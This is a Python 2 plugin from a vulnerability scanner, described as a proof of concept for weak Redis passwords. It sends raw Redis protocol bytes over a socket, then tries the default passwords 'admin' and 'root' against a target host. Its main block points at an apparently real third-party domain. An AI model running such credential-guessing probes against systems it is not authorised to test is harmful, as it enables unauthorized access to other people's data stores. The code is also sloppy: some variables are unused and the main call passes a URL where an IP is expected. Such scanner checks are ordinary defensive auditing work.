from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : redis weak password
Author    : a
mail      :a@lcx.cc
"""

import socket

def getPDList():
     pwlist =[]
     host = ""
     pass_list = [(0,'admin'),(1,'root')]
     for u ,p in pass_list:
         if len(p) ==0:
             p = 'testvul'
         pwlist.append(p)
     pwlist =  list(set(pwlist))
     return pwlist
    

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):

        curl=Curl()
        result = {}
        result['result']=False


        infopayload = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
        apayload = '\x2a\x32\x0d\x0a\x24\x34\x0d\x0a\x41\x55\x54\x48\x0d\x0a\x24'
        bpayload = '\x0d\x0a'
        authpadload = None
        pwlist =getPDList()
        try:
            s = socket.socket()
            s.connect((ip,int(port)))
            s.send(infopayload)
            data = s.recv(1024)
            if 'redis_version' not in data:
                for p in pwlist:
                    authpadload = apayload  + str(len(p)) +bpayload + p +  bpayload
                    s.send(authpadload)
                    data = s.recv(1024)
                    if 'OK' in data:
                        output('password :' + p,result,'hole')
                        break
                   
            s.close()
        except:
            pass
    

        del curl
        return result


def output(url,result,label):
    info = url + '  redis  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='redis Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/redis/redis_20acd453edc2cd2b2adc89a7abbaf213.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/redis/redis_20acd453edc2cd2b2adc89a7abbaf213.py
#/root/github/poccreate/codesrc/exp-756.py